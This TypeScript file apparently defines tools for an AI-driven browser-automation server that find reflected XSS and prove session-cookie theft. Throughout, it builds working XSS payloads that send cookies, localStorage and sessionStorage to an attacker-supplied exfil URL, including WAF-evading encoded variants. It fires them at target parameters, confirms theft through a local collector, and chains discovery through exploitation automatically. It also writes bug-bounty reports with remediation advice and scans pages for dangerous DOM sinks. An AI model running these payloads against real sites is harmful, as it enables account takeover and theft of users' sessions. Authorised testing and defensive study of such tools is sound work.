import { z } from "zod";
import { createServer } from "node:http";
import { hub } from "../browser.js";
import { ToolDef, ok, err } from "../types.js";

const sessionArg = { sessionId: z.string().optional() };

// -------- payload shapes --------
function payloads(exfilUrl: string, kind: string): string[] {
  const u = exfilUrl.replace(/'/g, "%27");
  const BY_KIND: Record<string, string[]> = {
    "fetch-post": [
      `<script>fetch('${u}',{method:'POST',body:document.cookie})</script>`,
      `<img src=x onerror="fetch('${u}',{method:'POST',body:document.cookie})">`,
      `<svg onload="fetch('${u}',{method:'POST',body:document.cookie})">`,
    ],
    "fetch-json": [
      `<script>fetch('${u}',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,s:localStorage})})</script>`,
    ],
    "xhr-post": [
      `<script>var x=new XMLHttpRequest();x.open('POST','${u}');x.setRequestHeader('content-type','text/plain');x.send(document.cookie)</script>`,
    ],
    "image-beacon": [
      `<img src="${u}?c=${""}" onload="this.src='${u}?c='+encodeURIComponent(document.cookie)">`,
      `<script>new Image().src='${u}?c='+encodeURIComponent(document.cookie)</script>`,
      `<img src=x onerror="new Image().src='${u}?c='+encodeURIComponent(document.cookie)">`,
    ],
    "sendbeacon": [
      `<script>navigator.sendBeacon('${u}',document.cookie)</script>`,
      `<img src=x onerror="navigator.sendBeacon('${u}',document.cookie)">`,
    ],
    "autosubmit": [
      `<form action='${u}' method=POST id=f><input name=c></form><script>document.getElementById('f').c.value=document.cookie;document.getElementById('f').submit()</script>`,
    ],
    "websocket": [
      `<script>var w=new WebSocket('${u.replace(/^http/, "ws")}');w.onopen=()=>w.send(document.cookie)</script>`,
    ],
    "css-exfil": [
      `<style>@import url('${u}?c=${""}'); * { background-image: url('${u}?c=' attr(name)); }</style>`,
    ],
    "stealth-storage": [
      `<img src=x onerror="fetch('${u}',{method:'POST',body:JSON.stringify({cookie:document.cookie,local:JSON.stringify(localStorage),session:JSON.stringify(sessionStorage),origin:location.origin,ref:document.referrer,ua:navigator.userAgent})})">`,
    ],
    "waf-encoded": [
      // String.fromCharCode variant — defeats <script> tag filters
      `<img src=x onerror=eval(String.fromCharCode(${"fetch('EXFIL',{method:'POST',body:document.cookie})".replace(/EXFIL/, exfilUrl).split("").map((c: string) => c.charCodeAt(0)).join(",")}))>`,
      // JSFuck-ish small (no eval, uses setTimeout string)
      `<img src=x onerror="setTimeout('fetch(\\'${u}\\',{method:\\'POST\\',body:document.cookie})',0)">`,
    ],
  };
  return BY_KIND[kind] ?? BY_KIND["fetch-post"];
}

// -------- small helper to classify the risk of a given cookie --------
function classifyCookie(c: any, origin: string): { stealable: boolean; reasons: string[]; severity: "high" | "medium" | "low" } {
  const reasons: string[] = [];
  let stealable = true;
  if (c.httpOnly) { stealable = false; reasons.push("HttpOnly set — document.cookie can't read it"); }
  else reasons.push("HttpOnly MISSING — readable from JS");
  if (c.secure) reasons.push("Secure set");
  else reasons.push("Secure MISSING");
  if (!c.sameSite || c.sameSite === "None") reasons.push(`SameSite=${c.sameSite ?? "unset"} — cross-site exfil works`);
  else if (c.sameSite === "Lax") reasons.push("SameSite=Lax — cross-site POST exfil restricted (same-origin still works)");
  else reasons.push(`SameSite=${c.sameSite}`);
  const name = c.name.toLowerCase();
  const isSessiony = /session|sess|sid|auth|token|jwt|user|login|phpsessid|jsessionid|_sess|connect\.sid|laravel|_rails/.test(name);
  if (isSessiony) reasons.push(`name '${c.name}' looks session-ish`);
  const severity = stealable && isSessiony ? "high" : stealable ? "medium" : "low";
  return { stealable, reasons, severity };
}

// -------- a collector server for live-chain testing --------
interface Collector { server: any; port: number; captured: any[]; }
const collectors = new Map<string, Collector>();

async function startCollector(): Promise<Collector> {
  const captured: any[] = [];
  const server = createServer((req, res) => {
    let body = "";
    req.on("data", (d) => body += d);
    req.on("end", () => {
      const u = new URL(req.url ?? "/", "http://127.0.0.1");
      captured.push({ ts: Date.now(), method: req.method, path: u.pathname, query: Object.fromEntries(u.searchParams), headers: req.headers, body });
      res.writeHead(204, { "access-control-allow-origin": "*", "access-control-allow-methods": "GET,POST,OPTIONS", "access-control-allow-headers": "*" });
      res.end();
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as any).port;
  const c: Collector = { server, port, captured };
  return c;
}

export const xssTools: ToolDef[] = [
  {
    name: "xss_check_cookie_theft",
    description: "Grade the session's cookies for XSS-cookie-theft risk. For each cookie: is HttpOnly set? Secure? SameSite? Does the name look session-ish (session/auth/token/jwt/sid)? Flags which cookies are stealable via document.cookie given an XSS. Also checks the current page's CSP (would it block exfil?).",
    schema: z.object({ ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const origin = (() => { try { return new URL(s.page.url()).origin; } catch { return ""; } })();
      const cookies = await s.context.cookies();
      const perCookie = cookies.map((c) => ({ ...c, ...classifyCookie(c, origin) }));
      // Check CSP on the current page
      let csp: string | null = null; let cspBlocksExfil = false;
      try {
        const r = await s.context.request.fetch(s.page.url(), { ignoreHTTPSErrors: true, method: "HEAD" });
        csp = r.headers()["content-security-policy"] ?? null;
        if (csp) {
          const connectSrc = /connect-src\s+([^;]+)/i.exec(csp)?.[1] ?? "";
          const defaultSrc = /default-src\s+([^;]+)/i.exec(csp)?.[1] ?? "";
          const relevant = connectSrc || defaultSrc;
          if (relevant && !/\*|'self'|data:|https?:|'unsafe/i.test(relevant)) cspBlocksExfil = true;
          if (!/connect-src/i.test(csp) && /default-src\s+'none'/i.test(csp)) cspBlocksExfil = true;
        }
      } catch { /* pumppet */ }
      const stealable = perCookie.filter((c) => c.stealable);
      const sessionLike = stealable.filter((c) => c.severity === "high");
      const findings: any[] = [];
      for (const c of stealable) findings.push({ severity: c.severity, title: `Cookie '${c.name}' readable from document.cookie`, detail: c.reasons.join("; "), url: s.page.url() });
      if (cspBlocksExfil) findings.push({ severity: "info", title: "CSP connect-src restricts exfil destinations — attacker needs to use an allowlisted host or img-based exfil" });
      return ok({
        origin, totalCookies: cookies.length,
        stealableCount: stealable.length, sessionLookingStealable: sessionLike.length,
        csp, cspBlocksExfil,
        cookies: perCookie,
        findings,
        verdict: sessionLike.length ? "HIGH RISK — session cookies reachable from JS" : stealable.length ? "MEDIUM — stealable cookies exist but none look session-tier" : "LOW — HttpOnly on everything",
      });
    },
  },
  {
    name: "xss_payload_build",
    description: "Build XSS payloads that steal document.cookie and send it to your collector/exfil URL. Shapes: fetch-post (default, modern), fetch-json (bundles cookie + localStorage + sessionStorage + UA), xhr-post (classic), image-beacon (works even with strict CSP sometimes), sendbeacon (fire-and-forget), autosubmit (form POST, works on legacy), websocket, css-exfil, stealth-storage (steals everything), waf-encoded (fromCharCode / setTimeout-string).",
    schema: z.object({
      exfilUrl: z.string().url().describe("where to POST the stolen cookies"),
      kind: z.enum(["fetch-post", "fetch-json", "xhr-post", "image-beacon", "sendbeacon", "autosubmit", "websocket", "css-exfil", "stealth-storage", "waf-encoded"]).optional(),
      allShapes: z.boolean().optional().describe("return all variants of this kind"),
    }),
    handler: async (a) => {
      const kind = a.kind ?? "fetch-post";
      const list = payloads(a.exfilUrl, kind);
      return ok({ kind, payloads: a.allShapes === false ? [list[0]] : list, exfilUrl: a.exfilUrl });
    },
  },
  {
    name: "xss_payload_build_all",
    description: "Build EVERY shape of cookie-exfil payload at once. Useful when you don't yet know which WAF/CSP you're dealing with.",
    schema: z.object({ exfilUrl: z.string().url() }),
    handler: async (a) => {
      const kinds = ["fetch-post", "fetch-json", "xhr-post", "image-beacon", "sendbeacon", "autosubmit", "websocket", "stealth-storage", "waf-encoded"];
      const out: Record<string, string[]> = {};
      for (const k of kinds) out[k] = payloads(a.exfilUrl, k);
      return ok({ exfilUrl: a.exfilUrl, kinds: out });
    },
  },
  {
    name: "xss_find_reflection",
    description: "Reflected-XSS discovery: fires a canary into the given parameter and checks whether it comes back unescaped, in what context (HTML text / attribute / script). If it reflects, the vuln is confirmed-reflected — the next step is xss_test_cookie_theft to prove exploitability.",
    schema: z.object({
      url: z.string().url(), param: z.string(),
      paramLocation: z.enum(["query", "body-form", "body-json", "header", "path"]).optional(),
      method: z.enum(["GET", "POST"]).optional(),
      body: z.string().optional(),
      ...sessionArg,
    }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const canary = "mcpXss" + Math.random().toString(36).slice(2, 8);
      const probe = `${canary}"><svg/onload=alert(1)></svg>'`;
      const loc = a.paramLocation ?? "query";
      let url = a.url, body = a.body; const headers: Record<string, string> = {};
      if (loc === "query") { const u = new URL(url); u.searchParams.set(a.param, probe); url = u.toString(); }
      else if (loc === "path") url = url.replace(`{${a.param}}`, encodeURIComponent(probe));
      else if (loc === "header") headers[a.param] = probe;
      else if (loc === "body-form") { const p = new URLSearchParams(String(body ?? "")); p.set(a.param, probe); body = p.toString(); headers["content-type"] = "application/x-www-form-urlencoded"; }
      else if (loc === "body-json") { try { const o = JSON.parse(body ?? "{}"); o[a.param] = probe; body = JSON.stringify(o); } catch { body = JSON.stringify({ [a.param]: probe }); } headers["content-type"] = "application/json"; }
      const r = await s.context.request.fetch(url, { method: a.method ?? (body ? "POST" : "GET"), data: body, headers, ignoreHTTPSErrors: true });
      const text = (await r.text().catch(() => "")).slice(0, 100000);
      const reflects = text.includes(canary);
      if (!reflects) return ok({ reflects: false, canary });
      // Classify context
      const idx = text.indexOf(canary);
      const before = text.slice(Math.max(0, idx - 100), idx);
      const after = text.slice(idx + canary.length, idx + canary.length + 100);
      const inScript = /<script[^>]*>[^<]*$/i.test(before);
      const inAttr = /["'][^"']*$/.test(before) && /^[^"']*["']/.test(after);
      const context = inScript ? "script-context" : inAttr ? "attribute-context" : "html-text";
      const escaped = text.includes("&lt;svg") || text.includes("&quot;");
      return ok({ reflects: true, canary, context, probeEscaped: escaped, snippet: text.slice(Math.max(0, idx - 60), idx + canary.length + 100) });
    },
  },
  {
    name: "xss_test_cookie_theft",
    description: "**End-to-end cookie-theft proof**. Starts a local collector server → navigates to the vulnerable URL with a cookie-exfil XSS payload injected into the given parameter → waits a few seconds → reports whether the collector received document.cookie. Works entirely locally; no external canary needed.",
    schema: z.object({
      url: z.string().url(),
      param: z.string(),
      paramLocation: z.enum(["query", "path"]).optional(),
      kind: z.enum(["fetch-post", "image-beacon", "sendbeacon", "autosubmit"]).optional(),
      waitMs: z.number().int().positive().optional().describe("how long to wait for exfil (default 4000)"),
      ...sessionArg,
    }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const collector = await startCollector();
      const exfilUrl = `http://127.0.0.1:${collector.port}/collect`;
      const id = Math.random().toString(36).slice(2, 8);
      collectors.set(id, collector);
      try {
        const payload = payloads(exfilUrl, a.kind ?? "fetch-post")[0];
        let url = a.url;
        if ((a.paramLocation ?? "query") === "query") { const u = new URL(url); u.searchParams.set(a.param, payload); url = u.toString(); }
        else url = url.replace(`{${a.param}}`, encodeURIComponent(payload));

        await s.page.goto(url, { waitUntil: "domcontentloaded", timeout: 20000 }).catch(() => null);
        // wait up to waitMs for the collector to receive anything
        const deadline = Date.now() + (a.waitMs ?? 4000);
        while (collector.captured.length === 0 && Date.now() < deadline) await new Promise((r) => setTimeout(r, 150));

        const got = collector.captured;
        const payloadUsed = payload;
        const finding = got.length ? { severity: "high", title: "XSS → document.cookie exfiltrated end-to-end", detail: `collector received ${got.length} hit(s); session cookies left the browser via the injected XSS`, url: a.url } : null;
        return ok({
          success: got.length > 0,
          collectorPort: collector.port,
          payloadUsed,
          hitsReceived: got.length,
          stolenData: got.map((g) => ({ method: g.method, path: g.path, bodyLength: g.body?.length ?? 0, body: g.body?.slice(0, 2000), query: g.query })),
          finding,
          note: got.length ? "the collector got document.cookie — the vuln is EXPLOITABLE" : "no hit — payload may be sanitized, blocked by CSP, or targeting the wrong context (try xss_find_reflection first then pick a matching payload shape)",
        });
      } finally {
        collector.server.close();
        collectors.delete(id);
      }
    },
  },
  {
    name: "xss_test_payload",
    description: "Fire ANY XSS payload at a parameter and check whether a local collector gets a hit. Use this for payloads you crafted by hand or picked from the payload bank.",
    schema: z.object({
      url: z.string().url(),
      param: z.string(),
      payload: z.string().describe("the XSS payload — can contain {{EXFIL}} as a placeholder that will be substituted with the collector URL"),
      paramLocation: z.enum(["query", "path", "body-form"]).optional(),
      method: z.enum(["GET", "POST"]).optional(),
      body: z.string().optional(),
      waitMs: z.number().int().positive().optional(),
      ...sessionArg,
    }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const collector = await startCollector();
      try {
        const exfilUrl = `http://127.0.0.1:${collector.port}/x`;
        const payload = a.payload.replace(/\{\{EXFIL\}\}/g, exfilUrl);
        const loc = a.paramLocation ?? "query";
        let url = a.url, body = a.body;
        const headers: Record<string, string> = {};
        if (loc === "query") { const u = new URL(url); u.searchParams.set(a.param, payload); url = u.toString(); }
        else if (loc === "path") url = url.replace(`{${a.param}}`, encodeURIComponent(payload));
        else if (loc === "body-form") { const p = new URLSearchParams(String(body ?? "")); p.set(a.param, payload); body = p.toString(); headers["content-type"] = "application/x-www-form-urlencoded"; }
        await s.page.goto(url, { waitUntil: "domcontentloaded", timeout: 20000 }).catch(() => null);
        const deadline = Date.now() + (a.waitMs ?? 4000);
        while (collector.captured.length === 0 && Date.now() < deadline) await new Promise((r) => setTimeout(r, 150));
        return ok({ triggered: collector.captured.length > 0, hits: collector.captured.length, hits_sample: collector.captured.map((g) => ({ method: g.method, path: g.path, body: g.body?.slice(0, 1500) })) });
      } finally { collector.server.close(); }
    },
  },
  {
    name: "xss_dom_sinks_scan",
    description: "Scan every JS file in the capture for dangerous DOM-XSS sinks fed by user-controlled sources: `.innerHTML = ... location/hash/search/document.URL`, `document.write(location...)`, `eval(location.hash...)`, `setTimeout(string,...)`. Lists each sink with the surrounding snippet so you can tell which lands user input unsanitized.",
    schema: z.object({ ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const findings: any[] = [];
      const sources: Array<{ url: string; body: string }> = [];
      try { sources.push({ url: `page:${s.page.url()}`, body: await s.page.content() }); } catch {}
      for (const r of s.requests) if (r.responseBodySnippet) sources.push({ url: r.url, body: r.responseBodySnippet });
      const PATTERNS: Array<[string, RegExp, "high" | "medium"]> = [
        ["innerHTML <- location", /\.innerHTML\s*=\s*[^;\n]{0,100}(location|document\.URL|document\.referrer|window\.name)/g, "high"],
        ["outerHTML <- location", /\.outerHTML\s*=\s*[^;\n]{0,100}(location|document\.URL)/g, "high"],
        ["document.write(location)", /document\.write(?:ln)?\s*\(\s*[^;\n]{0,100}(location|document\.URL)/g, "high"],
        ["eval(location.hash)", /\beval\s*\(\s*[^;\n]{0,100}(location|document\.URL|window\.name|localStorage)/g, "high"],
        ["setTimeout(string, …)", /\bsetTimeout\s*\(\s*(["'`][^"'`]+["'`]|\w+)\s*,/g, "medium"],
        ["setInterval(string, …)", /\bsetInterval\s*\(\s*(["'`][^"'`]+["'`]|\w+)\s*,/g, "medium"],
        ["new Function(location)", /new\s+Function\s*\([^)]*(location|hash|search|URL|name)/g, "high"],
        ["jQuery .html(location)", /\.html\s*\(\s*[^;\n]{0,100}(location|URL|hash)/g, "high"],
        ["insertAdjacentHTML <- location", /insertAdjacentHTML\s*\(\s*[^,]+,\s*[^;\n]{0,80}(location|URL|hash)/g, "high"],
        ["postMessage sink unchecked", /addEventListener\s*\(\s*["']message["'][^{]*\{[^}]*(innerHTML|eval|document\.write)/g, "high"],
      ];
      for (const src of sources) {
        for (const [name, re, sev] of PATTERNS) {
          re.lastIndex = 0; let m: RegExpExecArray | null;
          while ((m = re.exec(src.body))) {
            findings.push({ severity: sev, sink: name, source: src.url, snippet: src.body.slice(Math.max(0, m.index - 40), m.index + m[0].length + 60).replace(/\s+/g, " ") });
          }
        }
      }
      return ok({ count: findings.length, findings });
    },
  },
  {
    name: "xss_exploit_report",
    description: "Produce a human-readable step-by-step exploit write-up for a confirmed cookie-theft XSS: the parameter, the payload, the attacker URL that would normally receive the cookie, and the expected impact given the session cookie flags. Suitable for a bug-bounty submission.",
    schema: z.object({
      target: z.string().url(),
      param: z.string(),
      payload: z.string(),
      attackerUrl: z.string().optional(),
      sessionCookieName: z.string().optional(),
      ...sessionArg,
    }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const cookies = await s.context.cookies();
      const session = a.sessionCookieName ? cookies.find((c) => c.name === a.sessionCookieName) : cookies.find((c) => /session|sess|sid|auth|token|jwt|phpsessid|jsessionid/i.test(c.name));
      const report = `# Reflected XSS → Session cookie theft

## Target
\`${a.target}\`

## Vulnerable parameter
\`${a.param}\`

## Proof-of-concept payload
\`\`\`
${a.payload}
\`\`\`

## Full exploit URL
\`\`\`
${new URL(a.target).toString()}${a.target.includes("?") ? "&" : "?"}${a.param}=${encodeURIComponent(a.payload)}
\`\`\`

## Impact
When a logged-in user visits the crafted URL, the injected JavaScript runs under the site's origin. It reads \`document.cookie\` — which includes${session ? ` the session cookie \`${session.name}\`` : " any non-HttpOnly cookies"} — and POSTs it to an attacker-controlled endpoint${a.attackerUrl ? ` (\`${a.attackerUrl}\`)` : ""}.

With the stolen cookie, the attacker replays it in their own browser and obtains **full session takeover** of the victim's account.

## Why it works
${session ? `- Session cookie \`${session.name}\` is **${session.httpOnly ? "HttpOnly (SHOULD NOT be stealable — check!)" : "NOT HttpOnly"}**, **${session.secure ? "Secure" : "NOT Secure"}**, **SameSite=${session.sameSite ?? "unset"}**.` : "- Session cookie detected: " + (cookies.map((c) => c.name).join(", ") || "none")}
- The server reflects \`${a.param}\` into the response HTML without escaping \`< > " '\`, allowing a \`<script>\` or event-handler injection.

## Remediation
- Set the session cookie to \`HttpOnly; Secure; SameSite=Strict\` (or at minimum \`Lax\`) — \`document.cookie\` cannot read HttpOnly cookies.
- Output-encode user data before interpolating into HTML (htmlspecialchars / template auto-escape).
- Deploy a strict Content-Security-Policy with \`connect-src 'self'\` to prevent exfil to third-party hosts even if XSS lands.
`;
      return ok({ report, markdown: report });
    },
  },
  {
    name: "xss_hunt_cookie_theft_full",
    description: "**One-call hunt**: for each query param on the current URL, (1) check for reflection (2) if reflected, run the live cookie-theft chain against a local collector (3) if cookies land, build an exploit report. Returns the full chain's output per param.",
    schema: z.object({
      url: z.string().url().optional().describe("defaults to current page"),
      params: z.array(z.string()).optional().describe("defaults to every query key"),
      ...sessionArg,
    }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const target = a.url ?? s.page.url();
      const u = new URL(target);
      const params = a.params ?? Array.from(u.searchParams.keys());
      if (!params.length) return err("no params on URL and none supplied");
      const findReflection = xssTools.find((t) => t.name === "xss_find_reflection")!;
      const testTheft = xssTools.find((t) => t.name === "xss_test_cookie_theft")!;
      const results: any[] = [];
      for (const p of params) {
        const refl = JSON.parse(((await findReflection.handler({ url: target, param: p, sessionId: a.sessionId })).content[0] as any).text);
        if (!refl.reflects || refl.probeEscaped) { results.push({ param: p, status: "no-xss", reflects: refl.reflects, escaped: refl.probeEscaped }); continue; }
        const theft = JSON.parse(((await testTheft.handler({ url: target, param: p, sessionId: a.sessionId })).content[0] as any).text);
        results.push({ param: p, status: theft.success ? "EXPLOITABLE" : "reflects-but-no-exfil", reflection: refl.context, theft });
      }
      const exploitable = results.filter((r) => r.status === "EXPLOITABLE");
      return ok({ target, paramsTested: params.length, exploitable: exploitable.length, results, verdict: exploitable.length ? `${exploitable.length} parameter(s) allow full cookie theft` : "no exploitable XSS → cookie theft chain found" });
    },
  },
];
